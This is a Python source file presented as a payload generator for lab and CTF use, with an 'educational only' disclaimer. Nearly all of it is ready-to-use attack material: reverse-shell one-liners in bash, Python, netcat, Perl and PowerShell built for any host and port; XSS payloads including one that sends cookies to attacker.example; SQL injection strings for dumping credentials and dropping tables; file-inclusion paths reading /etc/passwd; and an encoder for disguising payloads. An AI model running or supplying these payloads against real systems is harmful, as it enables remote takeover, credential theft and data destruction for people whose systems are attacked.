"""Payload generator for offensive lab/CTF use.

EDUCATIONAL ONLY. Do not use against systems you do not own/have permission for.
"""
import base64
import urllib.parse


def reverse_shell(target_os: str, lhost: str, lport: int) -> dict:
    payloads = {}
    if target_os in ("linux", "unix", "all"):
        payloads["bash"] = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        payloads["bash_b64"] = base64.b64encode(payloads["bash"].encode()).decode()
        payloads["python"] = (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        )
        payloads["nc"] = f"nc -e /bin/sh {lhost} {lport}"
        payloads["perl"] = f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    if target_os in ("windows", "all"):
        payloads["powershell"] = (
            f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            f"$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbytes,0,$sendbytes.Length);"
            f"$stream.Flush()}};$client.Close()\""
        )
    return payloads


XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(document.cookie)",
    "\"><script>fetch('//attacker.example/?c='+document.cookie)</script>",
    "<iframe srcdoc=\"<script>parent.alert(1)</script>\">",
    "<body onload=alert('XSS')>",
    "<details open ontoggle=alert(1)>",
    "'\"><img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    "<input autofocus onfocus=alert(1)>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "\" OR \"\"=\"",
    "' UNION SELECT NULL, username, password FROM users--",
    "1' AND SLEEP(5)--",
    "admin'--",
    "' OR 1=1; DROP TABLE users--",
    "1' UNION SELECT @@version,2,3--",
    "0 UNION ALL SELECT NULL,concat(table_name) FROM information_schema.tables--",
    "'; WAITFOR DELAY '0:0:5'--",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd%00",
    "php://filter/convert.base64-encode/resource=index.php",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
]


def generate_xss(count: int = 10) -> list:
    return XSS_PAYLOADS[:count]


def generate_sqli(count: int = 10) -> list:
    return SQLI_PAYLOADS[:count]


def generate_lfi(count: int = 10) -> list:
    return LFI_PAYLOADS[:count]


def encode_payload(text: str) -> dict:
    return {
        "base64": base64.b64encode(text.encode()).decode(),
        "url": urllib.parse.quote(text),
        "double_url": urllib.parse.quote(urllib.parse.quote(text)),
        "hex": text.encode().hex(),
        "unicode": "".join(f"\\u{ord(c):04x}" for c in text),
        "html_entity": "".join(f"&#{ord(c)};" for c in text),
        "rot13": text.encode("rot_13") if hasattr(str, "encode_rot13") else "".join(
            chr((ord(c) - 97 + 13) % 26 + 97) if c.islower()
            else chr((ord(c) - 65 + 13) % 26 + 65) if c.isupper()
            else c for c in text
        ),
    }
